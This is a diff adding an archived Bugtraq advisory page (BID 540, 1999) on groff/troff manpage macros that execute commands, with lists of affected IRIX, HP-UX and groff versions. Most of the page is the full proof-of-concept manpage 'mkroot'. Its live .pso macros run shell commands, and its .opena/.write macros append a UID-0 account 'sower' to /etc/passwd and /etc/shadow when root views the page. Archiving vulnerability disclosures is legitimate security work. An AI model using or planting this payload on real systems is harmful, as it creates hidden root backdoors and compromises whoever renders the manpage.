@@ -1,0 +1,148 @@
+#bid540<p><b><span style="font-size: 18pt;">Groff/Troff Malicious Manpage Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/540/info">info</a><br><a href="http://www.securityfocus.com/bid/540/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/540/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/540/solution">solution</a><br><a href="http://www.securityfocus.com/bid/540/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				540
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Environment Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jul 25 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 25 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				First posted to BugTraq by Pawel Wilk &lt;siewca@dione.ids.pl&gt;on July 23, 1999. Followup containing man-page checker posted to BugTraq by Joel Eriksson &lt;jen@ettnet.se&gt; on July 25, 1999.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					SGI IRIX 6.5.3 <br/>
+					
+				
+					SGI IRIX 6.5.1 <br/>
+					
+				
+					SGI IRIX 6.5 <br/>
+					
+				
+					SGI IRIX 6.4 <br/>
+					
+				
+					SGI IRIX 6.3 <br/>
+					
+				
+					SGI IRIX 6.2 <br/>
+					
+				
+					SGI IRIX 6.1 <br/>
+					
+				
+					SGI IRIX 6.0.1 <br/>
+					
+				
+					SGI IRIX 6.0 <br/>
+					
+				
+					SGI IRIX 5.3 <br/>
+					
+				
+					SGI IRIX 5.2 <br/>
+					
+				
+					HP HP-UX 11.0 <br/>
+					
+				
+					HP HP-UX 10.0 <br/>
+					
+				
+					GNU groff 1.11 a<br/>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux 5.2  i386<br/>
+</span>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Debian Linux 2.1 <br/>
+					
+				
+					Debian Linux 2.0 r5<br/>
+					
+				
+					Debian Linux 2.0 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	.\" Copyright (c) 1999 PaweÂ³ Wilk &lt;siewca@dione.ids.pl&gt;<br/>.\"<br/>.\" This is free documentation; you can redistribute it and/or<br/>.\" modify it under the terms of the GNU General Public License as<br/>.\" published by the Free Software Foundation; either version 2 of<br/>.\" the License, or (at your option) any later version.<br/>.\"<br/>.\" The GNU General Public License's references to "object code"<br/>.\" and "executables" are to be interpreted as the output of any<br/>.\" document formatting or typesetting system, including<br/>.\" intermediate and printed output.<br/>.\"<br/>.\" This manual is distributed in the hope that it will be useful,<br/>.\" but WITHOUT ANY WARRANTY; without even the implied warranty of<br/>.\" MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the<br/>.\" GNU General Public License for more details.<br/>.\"<br/>.\" You should have received a copy of the GNU General Public<br/>.\" License along with this manual; if not, write to the Free<br/>.\" Software Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139,<br/>.\" USA.<br/>.\"<br/>.TH MKROOT 9 "07-22-1999" "manual page" "Linux Hacker's Manual"<br/>.SH NAME<br/>mkroot \- make a root-shell<br/>.SH SYNOPSIS<br/>.BI "man mkroot"<br/>.SH DISCLAIMER<br/>This manual page contains some \fBtroff\fP macros which could break your system's<br/>security. If you are looking at this page being logged as root then you should know <br/>that right in this moment you have allready created new, privileged account <br/>called "sower". The account is disabled by default because of security reasons. <br/>Don't forget to remove it! ;-&gt;<br/><br/>This is for information only.... use it at your own risk.<br/><br/>.SH DESCRIPTION<br/>Manual pages are usualy based on \fBtroff\fP (see<br/>.BR troff (1)<br/>) macros. The point is, that some of these macros can access files or<br/>even invoke some shell commands. It's usable, but try to imaginate<br/>that the \fBtroff\fP macros contained in manual pages may have root privileges <br/>if the \fBtroff\fP command's caller is root. (!)<br/>.br<br/>.LP<br/>The most dangerous macros are:<br/>.TP<br/>.BI ".pso" " command"<br/>used to display output of some \fIcommand\fP<br/>.TP<br/>.BI ".write" " stream string"<br/>used to put the \fIstring\fP into the given \fIstream\fP<br/>.LP<br/>.SH EXAMPLES<br/>.BI "/root directory listing" "   .pso ls -l /root"<br/>.nf<br/><br/>.pso ls -l /root <br/><br/>.fi<br/>.BI "creating new user called sower (passwd)" " "<br/>.nf<br/><br/>    .opena stream /etc/passwd<br/>    .write stream sower:*:0:0::/:/dev/null<br/><br/>.fi<br/>.opena stream /etc/passwd<br/>.write stream sower:!:0:0::/:/dev/null<br/>.BI "little preview" "   .pso tail /etc/passwd"<br/>.nf<br/><br/>.pso tail /etc/passwd<br/><br/>.fi<br/><br/>.BI "playing with shadow" ""<br/>.nf<br/><br/>    .opena stream /etc/shadow<br/>    .write stream sower:*:10531:0:99999:7::10794:<br/><br/>.fi<br/>.opena stream /etc/shadow<br/>.write stream sower:*:10531:0:99999:7::10794:<br/>.BI "fingering new user" "    .pso finger sower"<br/>.nf<br/><br/>.pso finger sower<br/><br/>.fi<br/>.SH FILES<br/>.I /etc/passwd<br/>.I /etc/shadow<br/><br/>.SH SEE ALSO<br/>.BR man (1),<br/>.BR passwd (1),<br/>.BR troff (1).<br/><br/>.SH AUTHOR<br/>Pawel Wilk &lt;siewca@dione.ids.pl&gt;
+	
+		<ul>
+</ul>
+</div>
